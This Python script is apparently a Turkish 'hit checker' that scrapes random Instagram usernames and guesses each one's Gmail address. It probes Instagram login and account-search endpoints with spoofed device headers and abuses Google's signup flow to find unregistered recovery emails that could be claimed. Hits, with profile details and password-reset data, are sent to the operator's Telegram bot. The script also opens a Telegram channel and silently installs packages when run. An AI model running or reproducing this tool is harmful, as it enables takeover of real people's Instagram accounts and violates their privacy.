import os
try:
    import webbrowser
    webbrowser.open("https://t.me/clsarvis")
except:
    pass
try:
  import requests
  import base64
  from uuid import uuid4
  import random
  from faker import Faker
  from ms4 import InfoIG, RestInsta
  import requests
  import time
  import hashlib
  import uuid
  import json
  from secrets import token_hex
  from ms4 import Instagram
  import pycountry
  import random
  import mechanize
  from bs4 import BeautifulSoup
  from user_agent import generate_user_agent
except:
  os.system("pip install ms4 mechanize bs4 uuid requests faker user_agent pycountry")
  os.system("pip install --upgrade ms4")

try:
    from ms4 import UserAgentGenerator
except ImportError:
    os.system("pip install --upgrade ms4")
    
import os
import re
import requests
from random import choice as cc, randint as rr
from user_agent import generate_user_agent
import string
import json
from ms4 import UserAgentGenerator
import requests
import base64
from uuid import uuid4
import random
from ms4 import InfoIG, RestInsta
import requests
import time
import hashlib
import uuid
from secrets import token_hex
import pycountry
import random
import mechanize
from bs4 import BeautifulSoup
from user_agent import generate_user_agent
import threading
import requests
import random
import requests
import os
import uuid
from secrets import token_hex
import time
from user_agent import generate_user_agent  
from ms4 import Instagram
from requests import get,post
from random import choice,randrange
import os,sys,uuid
import http.client
import requests
import re, uuid
import time
from time import sleep,time
from user_agent import generate_user_agent
from random import choice,randrange
from requests import get
import urllib.parse
import multiprocessing
import re
import random
import os,requests,sys,time,datetime
import requests
from random import randrange, choice
from faker import Faker
import os
from user_agent import generate_user_agent
fake = Faker()


# Ana Renkler
E = '\033[1;31m'  # kırmızı
G = '\033[1;35m'  # mor
Z = '\033[1;31m'  # kırmızı
X = '\033[1;33m'  # sarı
Z1 = '\033[2;31m'  # koyu kırmızı
F = '\033[2;32m'  # yeşil
A = '\033[2;34m'  # mavi
C = '\033[2;35m'  # pembe
B = '\x1b[38;5;208m'  # turuncu
Y = '\033[1;34m'  # açık mavi
M = '\x1b[1;37m'  # beyaz
S = '\033[1;33m'  # sarı
U = '\x1b[1;37m'  # beyaz




def logo():
    print(""" 
 ───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───
───█▒▒░░░░░░░░░▒▒█───
────█░░█░░░░░█░░█────
─▄▄──█░░░▀█▀░░░█──▄▄─
█░░█─▀▄░░░░░░░▄▀─█░░█                             
    """)
logo()

print(f""" -  By : @cin_goz0034 ┃  KANAL : @XROTRYVERTEX - """) 



token = input(f' {F}({C}1{F}) {Y} 𝐄𝐧𝐭𝐞𝐫 𝐓𝐨𝐤𝐞𝐧{F}  : ' + Z)
print(X + ' ═════════════════════════════════  ')
ID = input(f' {F}({C}2{F}) {Y} 𝐄𝐧𝐭𝐞𝐫 𝐈𝐃{F} : ' + Z)
print(X + ' ═════════════════════════════════  ')

hit = 0
gg = 0
bb = 0
go = 0
bm = 0


def PLAY():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'''━━━━━━━━━━━━━━━━━━━━━━━━━
Geliştirici: @cin_goz0034 | XROTRY VİP Tool
━━━━━━━━━━━━━━━━━━━━━━━━━
{F} [1] {F} {F}HİT   » 「{hit}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{B} [2] {B} {B}ORTA MAİL    » 「{gg}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{Z} [3] {Z} {Z}BAD    » 「{bb}」
━━━━━━━━━━━━━━━━━━━━━━━━━
{U} [4] {U} {U}Mevcut E-posta  » 「{email}」| 
━━━━━━━━━━━━━━━━━━━━━━━━━''')



def tlg(email):
    global hit
    user = email.split("@")[0]
    hit += 1
    try:
        rest = RestInsta.Rest(user)["email"]
    except:
        rest = "Nothing To Rest"

    inf = InfoIG.Instagram_Info(user)
    name = inf["Name"]
    Id = inf["ID"]
    fols = inf["Followers"]
    folg = inf["Following"]
    bio = inf["Bio"]
    po = inf["Posts"]
    pr = inf["Is Private"]   
    try:
      date = requests.get(f"https://o7aa.pythonanywhere.com/?id={Id}").json()['date']
    except:
      date = None
    
    
    tlg = f'''
 AŞKIM HİT DÜŞTÜ🤩❤️‍🩹🥰😈
[🤠] E-posta ==> {email}
[😚] RESET ==> {rest}
[🫠] Kullanıcı Adı ==> @{user}
[✌️] Bağlantı ==> https://www.instagram.com/{user}
⋘─────━❤️🌚━─────⋙
𝐓𝐀𝐑𝐀𝐅𝐈𝐍𝐃𝐀𝐍 : @cin_goz0034
KANAL: @XROTRYVERTEX

'''
    print(F + tlg)
    requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")

    with open('zayrexinsta.txt', 'a') as f:
        f.write(tlg + '\n')











def Blue():
    try:       
        n1=''.join(cc('officialteamshopofficialteamshop')for _ in range(rr(6,9)))
        n2=''.join(cc('officialteamshopofficialteamshop')for _ in range(rr(3,9)))
        host=''.join(cc('officialteamshopofficialteamshop')for _ in range(rr(15,30)))
        headers_init={"accept":"*/*","accept-language":"ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6","content-type":"application/x-www-form-urlencoded;charset=UTF-8","google-accounts-xsrf":"1","sec-ch-ua":"\"Not)A;Brand\";v=\"24\",\"Chromium\";v=\"116\"","sec-ch-ua-mobile":"?1","sec-ch-ua-platform":"\"Android\"","user-agent":str(generate_user_agent())}
        res1=requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',headers=headers_init)
        tok=re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',res1.text).group(2)
        cookies={'__Host-GAPS':host}
        headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp','user-agent':str(generate_user_agent())}
        data={'f.req':'["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]','deviceinfo':'[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'}
        response=requests.post('https://accounts.google.com/_/signup/validatepersonaldetails',cookies=cookies,headers=headers,data=data)
        tl=str(response.text).split('",null,"')[1].split('"')[0]
        host=response.cookies.get_dict()['__Host-GAPS']
        try:
            os.remove("Tokenz.txt")
        except:
            pass
        with open("Tokenz.txt", "w") as f:
            f.write(f"{host}${tl}")
    except Exception as e:
        print(e)
        print("Turn VPN ON....!")
        
def check_gmail(email):
    global go, bm
    if "@" in email:
        name = str(email).split("@")[0]        
    else:
        name = email
    try:
        try:
            with open("Tokenz.txt", "r") as f:
                line = f.readline().strip()
                host = line.split("$")[0]
                tl = line.split("$")[1]
        except:
            Blue()
            with open("Tokenz.txt", "r") as f:
                line = f.readline().strip()
                host = line.split("$")[0]
                tl = line.split("$")[1]

        cookies={'__Host-GAPS':host}
        headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,'user-agent':str(generate_user_agent())}
        params={'TL':tl}
        data=('continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+name+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&')
        response=requests.post('https://accounts.google.com/_/signup/usernameavailability',params=params,cookies=cookies,headers=headers,data=data)
        if '"gf.uar",1' in response.text:
            go += 1
            tlg(email)
            PLAY()
        elif '"gf.uar",2' in response.text or '"gf.uar",3' in response.text:
            bm += 1            
            PLAY()
        else:
            bm += 1
            Blue()
            print("Bad Tokenzz")
    except Exception as e:
        print(e)
     


class Agent:
    @staticmethod
    def user():
        ii = ["165.1.0.29.119", "166.0.0.30.120", "167.0.0.31.121", "168.0.0.32.122"]
        aa = {
            "28/9": ["720dpi", "1080dpi", "1440dpi"],
            "29/10": ["720dpi", "1080dpi", "1440dpi", "2160dpi"],
            "30/11": ["1080dpi", "1440dpi", "2160dpi"],
            "31/12": ["1440dpi", "2160dpi"]
        }
        ss = {
            "720dpi": ["1280x720", "1920x1080"],
            "1080dpi": ["1920x1080", "2560x1440", "3840x2160"],
            "1440dpi": ["2560x1440", "3840x2160"],
            "2160dpi": ["3840x2160", "7680x4320"]
        }
        dd = {
            "samsung": ["SM-T292", "SM-G973F", "SM-A515F"],
            "google": ["Pixel 4", "Pixel 5"],
            "huawei": ["P30 Pro", "Mate 40 Pro"],
            "xiaomi": ["Mi 10", "Redmi Note 10"],
            "oneplus": ["8T", "9 Pro"],
            "sony": ["XZ2", "Xperia 1"]
        }
        cc = ["qcom", "exynos", "kirin", "mediatek", "apple"]
        lan = ["en_US", "es_ES", "fr_FR", "de_DE", "zh_CN", "ja_JP", "ko_KR"]
        dp = ["phone", "tablet", "watch", "tv", "car"]
        arm = ["arm64_v8a", "armeabi-v7a", "x86", "x86_64"]
        comb = ["samsung", "google", "huawei", "xiaomi", "oneplus", "sony"]

        sos = random.choice(list(aa.keys()))
        vlo = random.choice(aa[sos])
        lop = random.choice(ss[vlo])
        ki = random.choice(comb)
        mo = random.choice(dd.get(ki, ["Unknown"]))

        user_agent = (
            f"Instagram {random.choice(ii)} Android "
            f"({sos}; {vlo}; {lop}; {ki}; {mo}; "
            f"{random.choice(arm)}; {random.choice(dp)}; "
            f"{random.choice(lan)}; {random.choice(cc)})"
        )

        return user_agent
        
        
class Variable:
    country = [country.numeric for country in pycountry.countries]
    num = random.choice(country)
    sgin = hashlib.sha256(uuid.uuid4().hex.encode()).hexdigest()
    csr = str(token_hex(8) * 2)
    android = f"android-{uuid.uuid4().hex[:16]}"



def AKM(email):
    global gg, bb
    try:
      IG = Instagram.CheckInsta(email)['Is_Available']
      if IG == 'true':
          gg += 1
          check_gmail(email)
      else:
          bb += 1
    except:
        bb += 1
        pass

def Login(email):
    global gg, bb
    tim = str(int(time.time()))
    psw = "qweaszxpo9999##$$"
    url = "https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/"

    payload = "params=%7B%22client_input_params%22%3A%7B%22should_show_nested_nta_from_aymh%22%3A0%2C%22device_id%22%3A%22android-bf1b282ab2b0b445%22%2C%22sim_phones%22%3A%5B%5D%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22Zt4loQABAAFzGR1YLL2M9XOkL9El%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22has_whatsapp_installed%22%3A1%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A1%3A"+tim+"%3A"+psw+"%22%2C%22sso_token_map_json_string%22%3A%22%22%2C%22family_device_id%22%3A%222586e714-fdb4-4741-ba7b-0b84b13e2a97%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A1%2C%22lois_settings%22%3A%7B%22lois_token%22%3A%22%22%2C%22lara_override%22%3A%22%22%7D%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22headers_infra_flow_id%22%3A%22%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22"+email+"%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22should_trigger_override_login_2fa_action%22%3A0%2C%22is_from_logged_out%22%3A0%2C%22should_trigger_override_login_success_action%22%3A0%2C%22login_credential_type%22%3A%22none%22%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%226947f919-c7d1-471a-b1b6-56bbd1e5e844%22%2C%22login_source%22%3A%22Login%22%2C%22is_platform_login%22%3A0%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_launch_ig4a_combined_60_percent%22%2C%22is_from_landing_page%22%3A0%2C%22password_text_input_id%22%3A%225ea5qa%3A135%22%2C%22is_from_empty_password%22%3A0%2C%22ar_event_source%22%3A%22login_home_page%22%2C%22qe_device_id%22%3A%228745a4a2-a663-4bc7-9b3b-16d5b8ea20b9%22%2C%22username_text_input_id%22%3A%225ea5qa%3A134%22%2C%22layered_homepage_experiment_group%22%3Anull%2C%22device_id%22%3A%22android-bf1b282ab2b0b445%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A3.2631949000395E13%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_caa_perf_enabled%22%3A1%2C%22credential_type%22%3A%22password%22%2C%22is_from_password_entry_page%22%3A0%2C%22caller%22%3A%22gslr%22%2C%22family_device_id%22%3A%222586e714-fdb4-4741-ba7b-0b84b13e2a97%22%2C%22INTERNAL_INFRA_THEME%22%3A%22default%2Cdefault%22%2C%22is_from_assistive_id%22%3A0%2C%22access_flow_version%22%3A%22F2_FLOW%22%2C%22is_from_logged_in_switcher%22%3A0%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%228ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb"

    headers = {
  'User-Agent': Agent.user(),
  #'Accept-Encoding': "zstd, gzip, deflate",
  'x-ig-app-locale': "en-US",
  'x-ig-device-locale': "en-US",
  'x-ig-mapped-locale': "en-US",
  'x-pigeon-session-id': "UFS-e075495d-6e46-4687-a0ac-3fb1210b71be-0",
  'x-pigeon-rawclienttime': "1725834678.526",
  'x-ig-bandwidth-speed-kbps': "-1.000",
  'x-ig-bandwidth-totalbytes-b': "0",
  'x-ig-bandwidth-totaltime-ms': "0",
  'x-bloks-version-id': "8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb",
  'x-ig-www-claim': "0",
  'x-bloks-is-layout-rtl': "true",
  'x-ig-device-id': "8745a4a2-a663-4bc7-9b3b-16d5b8ea20b9",
  'x-ig-family-device-id': "2586e714-fdb4-4741-ba7b-0b84b13e2a97",
  'x-ig-android-id': "android-bf1b282ab2b0b445",
  'x-ig-timezone-offset': "10800",
  'x-fb-connection-type': "MOBILE.LTE",
  'x-ig-connection-type': "MOBILE(LTE)",
  'x-ig-capabilities': "3brTv10=",
  'x-ig-app-id': "567067343352427",
  'priority': "u=3",
  'accept-language': "en-US",
  'x-mid': "Zt4loQABAAFzGR1YLL2M9XOkL9El",
  'ig-intended-user-id': "0",
  'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
  'x-fb-http-engine': "Liger",
  'x-fb-client-ip': "True",
  'x-fb-server-cluster': "True"
}
    try:
      response = requests.post(url, data=payload, headers=headers).text
      if '"status":"ok"' in response:
        if "The password you entered is incorrect." in response or "Login Error: An unexpected error occurred. Please try logging in again." in response:
            gg += 1
            PLAY()
            check_gmail(email)
        elif "Please wait a few minutes before you try again." in req:
            AKM(email)
        else:
            bb += 1
            PLAY()
      else:
          bb += 1
          PLAY()
          AKM(email)
    except:
        bb += 1
        PLAY()
        AKM(email)


def Ch(email):
    global gg, bb
    url = "https://i.instagram.com/api/v1/users/lookup/"
    payload = f"signed_body={Variable.sgin}.%7B%22country_codes%22%3A%22%5B%7B%5C%22country_code%5C%22%3A%5C%22{Variable.num}%5C%22%2C%5C%22source%5C%22%3A%5B%5C%22default%5C%22%5D%7D%5D%22%2C%22_csrftoken%22%3A%22{Variable.csr}%22%2C%22q%22%3A%22{email}%22%2C%22guid%22%3A%22{uuid.uuid4()}%22%2C%22device_id%22%3A%22{Variable.android}%22%2C%22directly_sign_in%22%3A%22true%22%7D&ig_sig_key_version=4"
    headers = {
        'User-Agent': str(Agent.user()),
        'Accept-Encoding': "gzip, deflate",
        'Content-Type': "application/x-www-form-urlencoded",
        'X-Pigeon-Session-Id': str(uuid.uuid4()),
        'X-Pigeon-Rawclienttime': str("{:.3f}".format(time.time())),
        'X-IG-Connection-Speed': "-1kbps",
        'X-IG-Bandwidth-Speed-KBPS': "-1.000",
        'X-IG-Bandwidth-TotalBytes-B': "0",
        'X-IG-Bandwidth-TotalTime-MS': "0",
        'X-Bloks-Version-Id': "009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0",
        'X-IG-Connection-Type': "MOBILE(LTE)",
        'X-IG-Capabilities': "3brTvw==",
        'X-IG-App-ID': "567067343352427",
        'Accept-Language': "ar-YE, en-US",
        'X-FB-HTTP-Engine': "Liger",
    }
    try:     
        res = requests.post(url, data=payload, headers=headers).text
        
        if '"status":"ok"' in res and f'{email}' in res:
            gg += 1
            PLAY()
            check_gmail(email)
        elif '"message":"لم يتم العثور على مستخدمين","status":"fail"' in res:
           bb += 1
           PLAY()
        else:       	
            Login(email)

    except:
        Login(email)
        

def Ahmed(email):
    global gg, bb
    url = "https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.caa.ar.search.async/"
    payload = "params=%7B%22client_input_params%22%3A%7B%22text_input_id%22%3A%22616z6k%3A71%22%2C%22was_headers_prefill_available%22%3A0%2C%22sfdid%22%3A%22%22%2C%22fetched_email_token_list%22%3A%7B%7D%2C%22search_query%22%3A%22"+email+"%22%2C%22android_build_type%22%3A%22release%22%2C%22accounts_list%22%3A%5B%5D%2C%22ig_android_qe_device_id%22%3A%228745a4a2-a663-4bc7-9b3b-16d5b8ea20b9%22%2C%22ig_oauth_token%22%3A%5B%5D%2C%22is_whatsapp_installed%22%3A1%2C%22lois_settings%22%3A%7B%22lois_token%22%3A%22%22%2C%22lara_override%22%3A%22%22%7D%2C%22was_headers_prefill_used%22%3A0%2C%22headers_infra_flow_id%22%3A%22%22%2C%22fetched_email_list%22%3A%5B%5D%2C%22sso_accounts_auth_data%22%3A%5B%5D%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22event_request_id%22%3A%22b8a5a2be-1abe-40da-b476-3d893c871e21%22%2C%22is_from_logged_out%22%3A0%2C%22layered_homepage_experiment_group%22%3Anull%2C%22device_id%22%3A%22android-bf1b282ab2b0b445%22%2C%22waterfall_id%22%3A%22017145b8-cb79-439a-9036-2fb580f40ca0%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A3.6480220400074E13%2C%22is_platform_login%22%3A0%2C%22context_data%22%3A%22AR2rfU7knJNQCBz3hzsomH487qVyGu0HOVx3jgM-6G69fIwxA73vDmSlV7vY-W2aR4sv08iPPcsbdDt7RQF0ijGeqPudYXN0zlEZMvLeGOEvM_HHTtEJuv8dHDd4c8AIk4VpoaEASAIC9T_OS4yHwzupVtJKe7ghZ7k0y3kHeS7OGhaAIm4QvqfWW5JendkDb0mWJ31hcpuhEp8qcbdjJ27ABYmh7-MltY9OrlgAoBsSZuz8_MD3S1XQFV0I52liYk8fK_tSI9x4Ok0lTmIWJ4aN8pjQvxGhAWLJ73ONhBVfpIXE2xuutHN4eMrjKARC2-XcGRmg7pf3xLfGu_Z7zKiKrVmR8LQz91dwiKHFaND6DeHwVcARkBjYm0YLjaGdT-0FIeGYFs1x%7Carm%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22family_device_id%22%3A%222586e714-fdb4-4741-ba7b-0b84b13e2a97%22%2C%22offline_experiment_group%22%3A%22caa_launch_ig4a_combined_60_percent%22%2C%22INTERNAL_INFRA_THEME%22%3A%22default%2Cdefault%22%2C%22access_flow_version%22%3A%22F2_FLOW%22%2C%22is_from_logged_in_switcher%22%3A0%2C%22qe_device_id%22%3A%228745a4a2-a663-4bc7-9b3b-16d5b8ea20b9%22%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%228ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb"
    headers = {
  'User-Agent': str(Agent.user()),
 # 'Accept-Encoding': "zstd, gzip, deflate",
  'x-ig-app-locale': "en-US",
  'x-ig-device-locale': "en-US",
  'x-ig-mapped-locale': "en-US",
  'x-pigeon-session-id': "UFS-42175dfd-8675-4443-8f8d-7f09fa7ea9da-0",
  'x-pigeon-rawclienttime': "1725835735.847",
  'x-ig-bandwidth-speed-kbps': "-1.000",
  'x-ig-bandwidth-totalbytes-b': "0",
  'x-ig-bandwidth-totaltime-ms': "0",
  'x-bloks-version-id': "8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb",
  'x-ig-www-claim': "0",
  'x-bloks-is-layout-rtl': "true",
  'x-ig-device-id': "8745a4a2-a663-4bc7-9b3b-16d5b8ea20b9",
  'x-ig-family-device-id': "2586e714-fdb4-4741-ba7b-0b84b13e2a97",
  'x-ig-android-id': "android-bf1b282ab2b0b445",
  'x-ig-timezone-offset': "10800",
  'x-fb-connection-type': "MOBILE.LTE",
  'x-ig-connection-type': "MOBILE(LTE)",
  'x-ig-capabilities': "3brTv10=",
  'x-ig-app-id': "567067343352427",
  'priority': "u=3",
  'accept-language': "en-US",
  'x-mid': "Zt4loQABAAFzGR1YLL2M9XOkL9El",
  'ig-intended-user-id': "0",
  'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
  'x-fb-http-engine': "Liger",
  'x-fb-client-ip': "True",
  'x-fb-server-cluster': "True"
}
    try:
      req = requests.post(url, data=payload, headers=headers).text
      
      if '"status":"ok"' in req:
        if "The password you entered is incorrect." in req or "We sent a code to your email. Enter that code to confirm your account." in req:
          gg += 1
          PLAY()
          check_gmail(email)
        elif "Please wait a few minutes before you try again." in req:
            Ch(email)
        else:
          bb += 1
          PLAY()
      else:
          Ch(email)
    except:
        Ch(email)
    





def get_username():
    global email
    while True:
        try:
            LsD = ''.join(random.choices(string.ascii_letters + string.digits, k=32))            
            bol = json.dumps({"id": str(random.randrange(10000, 53186034340)), "render_surface": "PROFILE"})         
            response = requests.post("https://www.instagram.com/api/graphql", headers={"X-FB-LSD": LsD, 'User-Agent': str(UserAgentGenerator),}, data = {"lsd": LsD, "variables": bol, "doc_id": "25618261841150840"})
            username = response.json()['data']['user']['username']     
            
            email = username + "@gmail.com"    
            Ahmed(email)            
        except:
            
            pass
                   

threads = []
for i in range(10):
    t = threading.Thread(target=get_username)
    threads.append(t)
    t.start()
for t in threads:
    t.join()      	 